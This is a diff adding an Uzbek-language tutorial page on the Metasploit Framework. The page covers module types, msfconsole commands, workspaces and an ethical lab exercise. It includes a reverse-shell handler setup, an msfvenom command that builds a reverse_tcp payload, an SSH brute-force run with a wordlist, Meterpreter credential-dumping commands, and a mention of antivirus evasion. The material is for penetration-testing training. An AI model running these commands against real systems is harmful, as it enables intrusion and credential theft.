@@ -1,0 +1,284 @@
+---
+title: "Metasploit Framework"
+description: "Metasploit — eng mashhur exploitation framework. Arkhitektura, asosiy modullar va etik foydalanish."
+order: 2
+level: "advanced"
+estimated_minutes: 7
+prerequisites:
+  - "/kali/ethical-hacking"
+  - "/kali/tools/nmap"
+learning_objectives:
+  - "Metasploit arxitekturasi va modul turlarini bilish"
+  - "`msfconsole` asosiy buyruqlari"
+  - "Auxiliary modullar (skan, ma'lumot to'plash) bilan tanishish"
+tags: ["kali", "metasploit", "exploitation", "tools"]
+lastUpdated: "2026-05-26"
+author: "LinuxHubuz jamoasi"
+references:
+  - title: "Metasploit Documentation"
+    url: "https://docs.metasploit.com/"
+  - title: "Rapid7 — Metasploit Framework"
+    url: "https://www.metasploit.com/"
+---
+
+<Callout type="danger" title="Faqat ruxsat etilgan tizimda">
+Metasploit faol exploitation vositasi. Uni faqat **o'z labingizda** yoki **yozma ruxsati bor** tizimlarda ishlating. Public yoki uchinchi tomon serveriga exploit yuborish — jinoiy javobgarlik.
+
+Mashq uchun: [Metasploitable](https://docs.rapid7.com/metasploit/metasploitable-2/) (rasmiy zaif VM), [HackTheBox](https://www.hackthebox.com/), [TryHackMe](https://tryhackme.com/).
+</Callout>
+
+**Metasploit Framework** — Rapid7 tomonidan rivojlantirilayotgan ochiq kodli penetration testing platform. 2000+ exploit, 1000+ auxiliary va boshqa modullarni o'z ichiga oladi.[¹](https://docs.metasploit.com/)
+
+<Callout type="info" title="Bu darsda nimani o'rganasiz">
+- Metasploit arxitekturasi.
+- 7 ta modul turi.
+- `msfconsole` asosiy buyruqlari.
+- Etik mashq labi.
+</Callout>
+
+## 1. Metasploit nima?
+
+Metasploit — to'liq exploitation lifecycle uchun framework:
+
+- **Information gathering** — `auxiliary/scanner/...`
+- **Vulnerability identification** — versiyalar va matching exploits
+- **Exploitation** — `exploit/...`
+- **Post-exploitation** — `post/...`, Meterpreter
+- **Reporting** — workspace, database
+
+Kali Linux'da default o'rnatilgan: `msfconsole` buyrug'i.
+
+## 2. Arxitektura
+
+```
+┌──────────────────────────────────────────────────────┐
+│             Foydalanuvchi interfeysi                  │
+│   msfconsole  │  msfvenom  │  msfdb  │  msfrpcd     │
+├──────────────────────────────────────────────────────┤
+│                    Framework                          │
+│   Modules │ Plugins │ Sessions │ Workspaces         │
+├──────────────────────────────────────────────────────┤
+│                Modul turlari                          │
+│  Exploit │ Payload │ Auxiliary │ Encoder │           │
+│  Nop     │ Post    │ Evasion                         │
+└──────────────────────────────────────────────────────┘
+```
+
+## 3. Modul turlari
+
+| Tur | Maqsad | Misol |
+|---|---|---|
+| **Exploit** | Maxsus zaiflikni ishlatish | `exploit/multi/http/struts2_namespace_ognl` |
+| **Auxiliary** | Skan, brute, fuzzing (exploit emas) | `auxiliary/scanner/portscan/syn` |
+| **Payload** | Exploit'dan keyin ishga tushadigan kod | `payload/linux/x64/meterpreter/reverse_tcp` |
+| **Post** | Sessiyadan keyin ma'lumot to'plash | `post/multi/recon/local_exploit_suggester` |
+| **Encoder** | Payload'ni o'zgartirish (signature evasion) | `encoder/x86/shikata_ga_nai` |
+| **Nop** | Buffer to'ldirish | `nop/x86/single_byte` |
+| **Evasion** | Antivirus chetlab o'tish | `evasion/windows/...` |
+
+## 4. Birinchi marotaba ishga tushirish
+
+```bash
+# PostgreSQL bazani boshlash (Metasploit uchun)
+sudo systemctl start postgresql
+
+# Metasploit konsoli
+msfconsole
+```
+
+Birinchi marotaba `msfconsole` `~/.msf4` ni yaratadi va paketni initializatsiya qiladi.
+
+## 5. Asosiy buyruqlar `msfconsole` ichida
+
+```msf
+# Yordam
+help
+
+# Versiya
+version
+
+# DB ulanishi
+db_status
+
+# Modul qidirish
+search type:exploit name:smb
+
+# Modul tanlash
+use exploit/multi/handler
+
+# Modul ma'lumotlari
+info
+
+# Parametrlar
+show options
+
+# Parametr o'rnatish
+set LHOST 192.168.1.50
+set LPORT 4444
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+
+# Modulni ishga tushirish
+run     # yoki exploit
+```
+
+## 6. Workspace — loyihalarni tashkillash
+
+```msf
+# Yangi workspace
+workspace -a my-pentest
+
+# Ro'yxat
+workspace
+
+# Almashish
+workspace my-pentest
+```
+
+Har bir workspace alohida — xostlar, ma'lumot, sessiyalar saqlanadi.
+
+## 7. Database integratsiya
+
+```msf
+# Hostlar
+hosts
+
+# Xizmatlar
+services
+
+# Zaifliklar
+vulns
+
+# Nmap natijasini import qilish
+db_nmap -sV -p 22,80 192.168.1.50
+
+# Yoki tashqi XML faylni
+db_import /path/to/nmap-result.xml
+```
+
+## 8. Auxiliary — eng xavfsiz modullar
+
+```msf
+# SMB versiyasini aniqlash
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+run
+
+# SSH login urinish (faqat lab'da!)
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.50
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+```
+
+## 9. Meterpreter (educational misol)
+
+`reverse_tcp` payload — qurboniy mashinadan attacker'ga ulanish ochadi (faqat lab'da test).
+
+Asosiy Meterpreter buyruqlari:
+
+```
+sysinfo                  # tizim ma'lumoti
+getuid                   # joriy foydalanuvchi
+ps                       # jarayonlar
+shell                    # to'liq shell
+download file.txt        # fayl olish
+upload local.txt /tmp/   # yuborish
+hashdump                 # parol xeshlari
+```
+
+## 10. Etik mashq muhiti
+
+**Hech qachon real serverga exploit yubormang.** Quyidagi resurslar maxsus mashq uchun:
+
+- [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2/) — rasmiy zaif Linux VM.
+- [DVWA](https://github.com/digininja/DVWA) — Damn Vulnerable Web Application.
+- [HackTheBox](https://www.hackthebox.com/) — sertifikatlangan, qonuniy.
+- [TryHackMe](https://tryhackme.com/) — boshlovchilar uchun.
+- [VulnHub](https://www.vulnhub.com/) — yuklash mumkin bo'lgan VM'lar.
+
+## 11. Foydali external buyruqlar (`msfconsole` tashqi)
+
+```bash
+# Payload yaratish (msfvenom)
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+    LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
+
+# Metasploit ma'lumot bazasi
+msfdb status
+msfdb init
+```
+
+## 12. Buyruqlar va izoh
+
+| Buyruq | Vazifa |
+|---|---|
+| `msfconsole` | Metasploit konsolini ochish |
+| `search <term>` | Modul qidirish |
+| `use <module>` | Modulni tanlash |
+| `info` | Modul ma'lumoti |
+| `show options` | Parametrlar |
+| `set <param> <value>` | Parametr |
+| `run` / `exploit` | Modul ishga tushirish |
+| `sessions -l` | Faol sessiyalar |
+| `sessions -i <id>` | Sessiyaga ulanish |
+| `workspace` | Workspace'lar |
+| `db_nmap` | Nmap'ni Metasploit DB bilan |
+
+## 13. Eng tez-tez uchraydigan xatolar
+
+- **Ruxsatsiz ishlatish** — jinoiy javobgarlik.
+- **PostgreSQL ishlamayapti** — `sudo systemctl start postgresql` kerak.
+- **`LHOST` xato** — attacker IP'ni to'g'ri belgilash kerak.
+- **Payload va exploit mos kelmaslik** — har bir exploit ma'lum payload turlarini qabul qiladi.
+- **Antivirus payload'ni bloklaydi** — encoder yoki evasion modul kerak (lekin bu allaqachon "kelishuv chegarasi").
+
+## 14. Eng yaxshi amaliyot
+
+- **Faqat o'z labingizda** mashq qiling.
+- **Metasploitable VM'ni o'rnating** — boshlovchilar uchun ideal.
+- **`workspace` har proyekt uchun alohida** — natijalar aralashmaydi.
+- **Loglarni saqlang** — `spool /tmp/msf.log` — sessiyaning hamma chiqishi faylga.
+- **Hisobotlar uchun `db_export`** — XML chiqishi.
+
+## 15. Bilim sinovi
+
+**Savol 1.** Metasploit'da exploit ishga tushirish uchun:
+
+- a) `start`
+- b) `run` yoki `exploit`
+- c) `execute`
+- d) `attack`
+
+<Callout type="success" title="Javob">
+**(b)** `run` va `exploit` sinonim — modulni ishga tushiradi.
+</Callout>
+
+**Savol 2.** `auxiliary/scanner/portscan/syn` — bu qaysi tur?
+
+- a) Exploit
+- b) Auxiliary (skan, lekin exploit emas)
+- c) Payload
+- d) Post-exploit
+
+<Callout type="success" title="Javob">
+**(b)** Auxiliary — exploit emas, balki yordamchi vositalar (skan, brute, fuzz).[¹](https://docs.metasploit.com/)
+</Callout>
+
+## 16. Mashq
+
+**Faqat o'z labingizda yoki rasmiy o'qish platformasida:**
+
+1. Metasploitable 2 VM'ni VirtualBox'ga import qiling.
+2. Kali VM va Metasploitable'ni bir tarmoqqa qo'ying (Internal yoki Host-only).
+3. `msfconsole` ni oching. `db_nmap -sV 192.168.X.X` (Metasploitable IP) bilan skanerlang.
+4. `search type:exploit` orqali topilgan zaifliklar bo'yicha qaysi exploit qo'llanilishi mumkinligini bilib chiqing. (Aniq qo'llashdan oldin — o'qing!)
+
+## Manbalar
+
+1. Metasploit Documentation. [https://docs.metasploit.com/](https://docs.metasploit.com/)
+2. Rapid7 — Metasploit Framework. [https://www.metasploit.com/](https://www.metasploit.com/)
+
+## Keyingi qadam
+
+👉 [Burp Suite asoslari](/kali/tools/burp-suite)
